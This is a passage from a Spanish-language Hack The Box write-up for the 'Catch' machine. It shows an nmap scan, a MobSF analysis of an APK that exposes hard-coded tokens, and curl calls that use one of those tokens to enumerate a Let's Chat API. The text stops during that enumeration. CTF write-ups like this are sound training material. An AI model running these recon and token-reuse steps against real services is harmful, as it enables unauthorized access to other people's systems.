@@ -1,0 +1,340 @@
+<!doctype html><html lang=es><head><title>Catch | 7Rocky</title><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><meta name=viewport content="width=device-width,minimum-scale=1"><meta name=description content="Hack The Box. Linux. Máquina media. Esta máquina ofrece un archivo APK que contiene tokens de autenticación hard-coded de otros servicios expuestos. Uno de los tokens puede ser usado para enumerar una aplicación de Let&rsquo;s Chat por medio de su API y obtener credenciales para Cachet. Este servicio es vulnerable a Server-Side Template Injection en PHP y podemos obtener más credenciales para acceder por SSH. La máquina ejecuta una tarea Cron para analizar archivos APK con un script en Bash que es vulnerable a inyección de comandos, por lo que tenemos que subir un archivo APK malicioso para exploitarlo y convertirnos en root"><meta itemprop=description content="Hack The Box. Linux. Máquina media. Esta máquina ofrece un archivo APK que contiene tokens de autenticación hard-coded de otros servicios expuestos. Uno de los tokens puede ser usado para enumerar una aplicación de Let&rsquo;s Chat por medio de su API y obtener credenciales para Cachet. Este servicio es vulnerable a Server-Side Template Injection en PHP y podemos obtener más credenciales para acceder por SSH. La máquina ejecuta una tarea Cron para analizar archivos APK con un script en Bash que es vulnerable a inyección de comandos, por lo que tenemos que subir un archivo APK malicioso para exploitarlo y convertirnos en root"><meta name=twitter:description content="Hack The Box. Linux. Máquina media. Esta máquina ofrece un archivo APK que contiene tokens de autenticación hard-coded de otros servicios expuestos. Uno de los tokens puede ser usado para enumerar una aplicación de Let&rsquo;s Chat por medio de su API y obtener credenciales para Cachet. Este servicio es vulnerable a Server-Side Template Injection en PHP y podemos obtener más credenciales para acceder por SSH. La máquina ejecuta una tarea Cron para analizar archivos APK con un script en Bash que es vulnerable a inyección de comandos, por lo que tenemos que subir un archivo APK malicioso para exploitarlo y convertirnos en root"><meta property="og:description" content="Hack The Box. Linux. Máquina media. Esta máquina ofrece un archivo APK que contiene tokens de autenticación hard-coded de otros servicios expuestos. Uno de los tokens puede ser usado para enumerar una aplicación de Let&rsquo;s Chat por medio de su API y obtener credenciales para Cachet. Este servicio es vulnerable a Server-Side Template Injection en PHP y podemos obtener más credenciales para acceder por SSH. La máquina ejecuta una tarea Cron para analizar archivos APK con un script en Bash que es vulnerable a inyección de comandos, por lo que tenemos que subir un archivo APK malicioso para exploitarlo y convertirnos en root"><meta name=robots content="index, follow"><meta name=author content="7Rocky"><meta name=twitter:author content="7Rocky"><meta property="og:author" content="7Rocky"><meta name=image content="https://7rocky.github.io/images/HTB/Catch/Catch.png"><meta name=twitter:image content="https://7rocky.github.io/images/HTB/Catch/Catch.png"><meta property="og:image" content="https://7rocky.github.io/images/HTB/Catch/Catch.png"><meta property="og:site_name" content="7Rocky"><meta itemprop=name content="Catch"><meta property="og:title" content="Catch"><meta property="og:url" content="https://7rocky.github.io/htb/catch/"><meta itemprop=keywords content="api,cve,php,android,cronjob,reversing,command-injection,password-reuse,ssti,"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href=/images/favicon.ico type=image/x-icon><link href=/css/style.css rel=stylesheet><link href=/css/main.css rel=stylesheet><link href=/css/monokai-sublime.min.css rel=stylesheet><link href=/css/code.css rel=stylesheet><script src=/js/highlight.min.js></script>
+<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script><script src=/js/htb.js></script></head><body class="ma0 production"><header style=position:sticky;top:0;z-index:9><div class=bg-black><nav class=ph4-ns role=navigation><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href=/ title=7Rocky>7Rocky</a><div class="flex-l items-center"><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href title=es><img alt=es height=30px src=/images/es.png width=30px></a>
+<a class="link-transition lang link dib z-999 pt3 pt0-l" href=/en/htb/catch/ title=en><img alt=en height=30px src=/images/en.png style="border:4px solid#000;border-radius:100%" width=30px></a><ul class="pl0 ml3 mr3" style=line-height:30px><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href=/ctf/ title=CTF>CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href=/htb/ title=HTB>HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href=/imc/ title=IMC>IMC</a></li></ul><a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel=noopener aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class=pb7 role=main><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-100"><aside aria-label=aside class="instapaper_ignoref b helvetica tracked">HTB</aside><div id=sharing class=mt3><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/htb/catch/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/htb/catch/&text=Catch" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/htb/catch/&title=Catch" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Catch</h1><time class="f6 mv4 dib tracked" datetime=2022-07-23T00:00:00+01:00>23 / 07 / 2022</time></header><div class=htb-image><img alt=Catch src=/images/HTB/Catch/Catch.png></div><ul class="nested-links tags"><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/api title=API>API</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/cve title=CVE>CVE</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/php title=PHP>PHP</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/android title=Android>Android</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/cronjob title="Tareas Cron">Tareas Cron</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/reversing title="Ingeniería inversa">Ingeniería inversa</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/command-injection title="Inyección de Comandos">Inyección de Comandos</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/password-reuse title="Reutilización de contraseñas">Reutilización de contraseñas</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/ssti title="Server-Side Template Injection">Server-Side Template Injection</a></li></ul><aside aria-label=aside class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:5rem><p class="f5 b mb3">Contenidos de este write-up</p><nav id=TableOfContents><ul><li><a href=#escaneo-de-puertos>Escaneo de puertos</a></li><li><a href=#analizando-un-archivo-apk>Analizando un archivo APK</a></li><li><a href=#enumeración-web>Enumeración web</a></li><li><a href=#enumeración-del-sistema>Enumeración del sistema</a></li><li><a href=#escalada-de-privilegios>Escalada de privilegios</a></li></ul></nav></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>SO</strong>: Linux</li><li><strong>Dificultad</strong>: Media</li><li><strong>Dirección IP</strong>: 10.10.11.150</li><li><strong>Fecha</strong>: 12 / 03 / 2022</li></ul><h2 id=escaneo-de-puertos>Escaneo de puertos</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-plaintext data-lang=plaintext><span style=display:flex><span># Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.150 -p 22,80,3000,5000,8000
+</span></span><span style=display:flex><span>Nmap scan report for 10.10.11.150
+</span></span><span style=display:flex><span>Host is up (0.086s latency).
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>PORT     STATE SERVICE VERSION
+</span></span><span style=display:flex><span>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+</span></span><span style=display:flex><span>| ssh-hostkey:
+</span></span><span style=display:flex><span>|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
+</span></span><span style=display:flex><span>|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
+</span></span><span style=display:flex><span>|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
+</span></span><span style=display:flex><span>80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
+</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.41 (Ubuntu)
+</span></span><span style=display:flex><span>|_http-title: Catch Global Systems
+</span></span><span style=display:flex><span>3000/tcp open  ppp?
+</span></span><span style=display:flex><span>| fingerprint-strings:
+</span></span><span style=display:flex><span>|   GenericLines, Help, RTSPRequest:
+</span></span><span style=display:flex><span>|     HTTP/1.1 400 Bad Request
+</span></span><span style=display:flex><span>|     Content-Type: text/plain; charset=utf-8
+</span></span><span style=display:flex><span>|     Connection: close
+</span></span><span style=display:flex><span>|     Request
+</span></span><span style=display:flex><span>|   GetRequest:
+</span></span><span style=display:flex><span>|     HTTP/1.0 200 OK
+</span></span><span style=display:flex><span>|     Content-Type: text/html; charset=UTF-8
+</span></span><span style=display:flex><span>|     Set-Cookie: i_like_gitea=c4add8273ad10169; Path=/; HttpOnly
+</span></span><span style=display:flex><span>|     Set-Cookie: _csrf=mnsU0O5Ra5DDvk5hMde46oeBYXA6MTY1ODE3MDcyNzUxMDc4MTQ0Mg; Path=/; Expires=Tue, 19 Jul 2022 18:58:47 GMT; HttpOnly; SameSite=Lax
+</span></span><span style=display:flex><span>|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly
+</span></span><span style=display:flex><span>|     X-Frame-Options: SAMEORIGIN
+</span></span><span style=display:flex><span>|     Date:
+</span></span><span style=display:flex><span>|     &lt;!DOCTYPE html&gt;
+</span></span><span style=display:flex><span>|     &lt;html lang=&#34;en-US&#34; class=&#34;theme-&#34;&gt;
+</span></span><span style=display:flex><span>|     &lt;head data-suburl=&#34;&#34;&gt;
+</span></span><span style=display:flex><span>|     &lt;meta charset=&#34;utf-8&#34;&gt;
+</span></span><span style=display:flex><span>|     &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1&#34;&gt;
+</span></span><span style=display:flex><span>|     &lt;meta http-equiv=&#34;x-ua-compatible&#34; content=&#34;ie=edge&#34;&gt;
+</span></span><span style=display:flex><span>|     &lt;title&gt; Catch Repositories &lt;/title&gt;
+</span></span><span style=display:flex><span>|     &lt;link rel=&#34;manifest&#34; href=&#34;data:application/json;base64,eyJuYW1lIjoiQ2F0Y2ggUmVwb3NpdG9yaWVzIiwic2hvcnRfbmFtZSI6IkNhdGNoIFJlcG9zaXRvcmllcyIsInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jYXRjaC5odGI6MzAwMC8iLCJpY29ucyI6W3sic3JjIjoiaHR0cDovL2dpdGVhLmNhdGNoLmh0Yjoz
+</span></span><span style=display:flex><span>|   HTTPOptions:
+</span></span><span style=display:flex><span>|     HTTP/1.0 405 Method Not Allowed
+</span></span><span style=display:flex><span>|     Set-Cookie: i_like_gitea=a52174aa7176ecac; Path=/; HttpOnly
+</span></span><span style=display:flex><span>|     Set-Cookie: _csrf=HmeoQlGnj2FP7rgeJT-YACIGwbk6MTY1ODE3MDczMzE2MjUyNDQ4Ng; Path=/; Expires=Tue, 19 Jul 2022 18:58:53 GMT; HttpOnly; SameSite=Lax
+</span></span><span style=display:flex><span>|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly
+</span></span><span style=display:flex><span>|     X-Frame-Options: SAMEORIGIN
+</span></span><span style=display:flex><span>|     Date: Mon, 18 Jul 2022 18:58:53 GMT
+</span></span><span style=display:flex><span>|_    Content-Length: 0
+</span></span><span style=display:flex><span>5000/tcp open  upnp?
+</span></span><span style=display:flex><span>| fingerprint-strings:
+</span></span><span style=display:flex><span>|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, RTSPRequest, SMBProgNeg, ZendJavaBridge:
+</span></span><span style=display:flex><span>|     HTTP/1.1 400 Bad Request
+</span></span><span style=display:flex><span>|     Connection: close
+</span></span><span style=display:flex><span>|   GetRequest:
+</span></span><span style=display:flex><span>|     HTTP/1.1 302 Found
+</span></span><span style=display:flex><span>|     X-Frame-Options: SAMEORIGIN
+</span></span><span style=display:flex><span>|     X-Download-Options: noopen
+</span></span><span style=display:flex><span>|     X-Content-Type-Options: nosniff
+</span></span><span style=display:flex><span>|     X-XSS-Protection: 1; mode=block
+</span></span><span style=display:flex><span>|     Content-Security-Policy:
+</span></span><span style=display:flex><span>|     X-Content-Security-Policy:
+</span></span><span style=display:flex><span>|     X-WebKit-CSP:
+</span></span><span style=display:flex><span>|     X-UA-Compatible: IE=Edge,chrome=1
+</span></span><span style=display:flex><span>|     Location: /login
+</span></span><span style=display:flex><span>|     Vary: Accept, Accept-Encoding
+</span></span><span style=display:flex><span>|     Content-Type: text/plain; charset=utf-8
+</span></span><span style=display:flex><span>|     Content-Length: 28
+</span></span><span style=display:flex><span>|     Set-Cookie: connect.sid=s%3AJOtQ3i7EmG91-WEf4EQIm57CDg8l6Qvt.wqsCV4JfUvlp54pre9ayq1zvMjJdCQVYMGfc%2BBkKKPA; Path=/; HttpOnly
+</span></span><span style=display:flex><span>|     Date:
+</span></span><span style=display:flex><span>|     Connection: close
+</span></span><span style=display:flex><span>|     Found. Redirecting to /login
+</span></span><span style=display:flex><span>|   HTTPOptions:
+</span></span><span style=display:flex><span>|     HTTP/1.1 200 OK
+</span></span><span style=display:flex><span>|     X-Frame-Options: SAMEORIGIN
+</span></span><span style=display:flex><span>|     X-Download-Options: noopen
+</span></span><span style=display:flex><span>|     X-Content-Type-Options: nosniff
+</span></span><span style=display:flex><span>|     X-XSS-Protection: 1; mode=block
+</span></span><span style=display:flex><span>|     Content-Security-Policy:
+</span></span><span style=display:flex><span>|     X-Content-Security-Policy:
+</span></span><span style=display:flex><span>|     X-WebKit-CSP:
+</span></span><span style=display:flex><span>|     X-UA-Compatible: IE=Edge,chrome=1
+</span></span><span style=display:flex><span>|     Allow: GET,HEAD
+</span></span><span style=display:flex><span>|     Content-Type: text/html; charset=utf-8
+</span></span><span style=display:flex><span>|     Content-Length: 8
+</span></span><span style=display:flex><span>|     ETag: W/&#34;8-ZRAf8oNBS3Bjb/SU2GYZCmbtmXg&#34;
+</span></span><span style=display:flex><span>|     Set-Cookie: connect.sid=s%3AMV6FPc2fj8xR1N8MB0sdWFGVlKpMTVRw.Nfg63NvC%2FRxP6po46sBGOZ1w2DhldLydbieGNTsj8VE; Path=/; HttpOnly
+</span></span><span style=display:flex><span>|     Vary: Accept-Encoding
+</span></span><span style=display:flex><span>|     Date:
+</span></span><span style=display:flex><span>|     Connection: close
+</span></span><span style=display:flex><span>|_    GET,HEAD
+</span></span><span style=display:flex><span>8000/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.29 (Ubuntu)
+</span></span><span style=display:flex><span>|_http-title: Catch Global Systems
+</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style=display:flex><span># Nmap done -- 1 IP address (1 host up) scanned in 97.06 seconds
+</span></span></code></pre></div><p>La máquina tiene abiertos los puertos 22 (SSH), 80, 3000, 5000 y 8000 (HTTP).</p><h2 id=analizando-un-archivo-apk>Analizando un archivo APK</h2><p>Si vamos a <code>http://10.10.11.150</code>, veremos esta página web:</p><p><img src=/images/HTB/Catch/Catch-index.png alt="Catch index"></p><p>Aquí podemos descargar un archivo APK llamado <code>catchv1.0.apk</code>. Vamos a arrancar <a href=https://github.com/MobSF/Mobile-Security-Framework-MobSF>MobSF</a> para subir el archivo APK:</p><p><img src=/images/HTB/Catch/Catch-mobsf.png alt="Catch MobSF"></p><p>Se puede observar un subdominio: <code>status.catch.htb</code>, pero contiene la misma página que arriba.</p><p><img src=/images/HTB/Catch/Catch-mobsf-subdomain.png alt="Catch MobSF subdomain"></p><p>Mirando las cadenas de caracteres, vemos tres <em>tokens</em> de autenticación:</p><p><img src=/images/HTB/Catch/Catch-mobsf-tokens.png alt="Catch MobSF tokens"></p><p>A lo mejor nos podemos autenticar a algún servicio con estos <em>tokens</em>.</p><h2 id=enumeración-web>Enumeración web</h2><p>De hecho, <code>http://10.10.11.150:3000</code> muestra una instancia de Gitea:</p><p><img src=/images/HTB/Catch/Catch-gitea.png alt="Catch Gitea"></p><p>Luego, <code>http://10.10.11.150:5000</code> tiene Let&rsquo;s Chat:</p><p><img src=/images/HTB/Catch/Catch-lets-chat.png alt="Catch Let&amp;rsquo;s Chat"></p><p>Y finalmente <code>http://10.10.11.150:8000</code> contiene un Cachet:</p><p><img src=/images/HTB/Catch/Catch-cachet-1.png alt="Catch Cachet 1"></p><p><img src=/images/HTB/Catch/Catch-cachet-2.png alt="Catch Cachet 1"></p><p>Después de investigar, veremos que Let&rsquo;s Chat tiene una API disponible con los siguientes recursos (más información en <a href=https://github.com/sdelements/lets-chat/wiki/API>github.com</a>):</p><p><img src=/images/HTB/Catch/Catch-lets-chat-api.png alt="Catch Let&amp;rsquo;s Chat API"></p><p>Usando <code>lets_chat_token</code> en la cabecera de petición <code>Authorization</code>, podremos leer información de las salas de Let&rsquo;s Chat:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> token=<span class=code-dark-yellow>'NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ=='</span>  
+
+<span class=code-cyan>$</span> <span class=code-dark-green>curl</span> 10.10.11.150:5000/rooms -sH <span class=code-dark-yellow>"Authorization: Bearer <span class=code-dark-cyan>$token</span>"</span> | <span class=code-dark-green>jq</span>
+<span class=code-white>[</span>
+<span class=code-white>  {</span>
+<span class=code-white>    <span class=code-blue>"id"<span class=code-white>: <span class=code-dark-green>"61b86b28d984e2451036eb17"<span class=code-white>,</span>
+<span class=code-white>    <span class=code-blue>"slug"<span class=code-white>: <span class=code-dark-green>"status"<span class=code-white>,</span>
+<span class=code-white>    <span class=code-blue>"name"<span class=code-white>: <span class=code-dark-green>"Status"<span class=code-white>,</span>
+<span class=code-white>    <span class=code-blue>"description"<span class=code-white>: <span class=code-dark-green>"Cachet Updates and Maintenance"<span class=code-white>,</span>
+<span class=code-white>    <span class=code-blue>"lastActive"<span class=code-white>: <span class=code-dark-green>"2021-12-14T10:34:20.749Z"<span class=code-white>,</span>
+<span class=code-white>    <span class=code-blue>"created"<span class=code-white>: <span class=code-dark-green>"2021-12-14T10:00:08.384Z"<span class=code-white>,</span>
+<span class=code-white>    <span class=code-blue>"owner"<span class=code-white>: <span class=code-dark-green>"61b86aead984e2451036eb16"<span class=code-white>,</span>
+<span class=code-white>    <span class=code-blue>"private"<span class=code-white>: </span>false<span class=code-white>,</span>
+<span class=code-white>    <span class=code-blue>"hasPassword"<span class=code-white>: </span>false<span class=code-white>,</span>
+<span class=code-white>    <span class=code-blue>"participants"<span class=code-white>: []</span>
+<span class=code-white>  },</span>
+<span class=code-white>  {</span>
+<span class=code-white>    <span class=code-blue>"id"<span class=code-white>: <span class=code-dark-green>"61b8708efe190b466d476bfb"<span class=code-white>,</span>
+<span class=code-white>    <span class=code-blue>"slug"<span class=code-white>: <span class=code-dark-green>"android_dev"<span class=code-white>,</span>
+<span class=code-white>    <span class=code-blue>"name"<span class=code-white>: <span class=code-dark-green>"Android Development"<span class=code-white>,</span>
+<span class=code-white>    <span class=code-blue>"description"<span class=code-white>: <span class=code-dark-green>"Android App Updates, Issues & More"<span class=code-white>,</span>
+<span class=code-white>    <span class=code-blue>"lastActive"<span class=code-white>: <span class=code-dark-green>"2021-12-14T10:24:21.145Z"<span class=code-white>,</span>
+<span class=code-white>    <span class=code-blue>"created"<span class=code-white>: <span class=code-dark-green>"2021-12-14T10:23:10.474Z"<span class=code-white>,</span>
+<span class=code-white>    <span class=code-blue>"owner"<span class=code-white>: <span class=code-dark-green>"61b86aead984e2451036eb16"<span class=code-white>,</span>
+<span class=code-white>    <span class=code-blue>"private"<span class=code-white>: </span>false<span class=code-white>,</span>
+<span class=code-white>    <span class=code-blue>"hasPassword"<span class=code-white>: </span>false<span class=code-white>,</span>
+<span class=code-white>    <span class=code-blue>"participants"<span class=code-white>: []</span>
+<span class=code-white>  },</span>
+<span class=code-white>  {</span>
+<span class=code-white>    <span class=code-blue>"id"<span class=code-white>: <span class=code-dark-green>"61b86b3fd984e2451036eb18"<span class=code-white>,</span>
+<span class=code-white>    <span class=code-blue>"slug"<span class=code-white>: <span class=code-dark-green>"employees"<span class=code-white>,</span>
+<span class=code-white>    <span class=code-blue>"name"<span class=code-white>: <span class=code-dark-green>"Employees"<span class=code-white>,</span>
+<span class=code-white>    <span class=code-blue>"description"<span class=code-white>: <span class=code-dark-green>"New Joinees, Org updates"<span class=code-white>,</span>
+<span class=code-white>    <span class=code-blue>"lastActive"<span class=code-white>: <span class=code-dark-green>"2021-12-14T10:18:04.710Z"<span class=code-white>,</span>
+<span class=code-white>    <span class=code-blue>"created"<span class=code-white>: <span class=code-dark-green>"2021-12-14T10:00:31.043Z"<span class=code-white>,</span>
+<span class=code-white>    <span class=code-blue>"owner"<span class=code-white>: <span class=code-dark-green>"61b86aead984e2451036eb16"<span class=code-white>,</span>
+<span class=code-white>    <span class=code-blue>"private"<span class=code-white>: </span>false<span class=code-white>,</span>
+<span class=code-white>    <span class=code-blue>"hasPassword"<span class=code-white>: </span>false<span class=code-white>,</span>
+<span class=code-white>    <span class=code-blue>"participants"<span class=code-white>: []</span>
+<span class=code-white>  }</span>
+<span class=code-white>]
+</code></pre></div><p>Para extraer los identificadores de sala emplearé <a href=https://github.com/TomNomNom/gron><code>gron</code></a>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> 10.10.11.150:5000/rooms -sH <span class=code-dark-yellow>"Authorization: Bearer <span class=code-dark-cyan>$token</span>"</span> | <span class=code-dark-green>gron</span> | <span class=code-dark-green>grep</span> <span class=code-dark-yellow>'\.id'</span> | <span class=code-dark-green>norg</span>  
+<span class=code-dark-magenta>[</span>
+  <span class=code-dark-magenta>{</span>
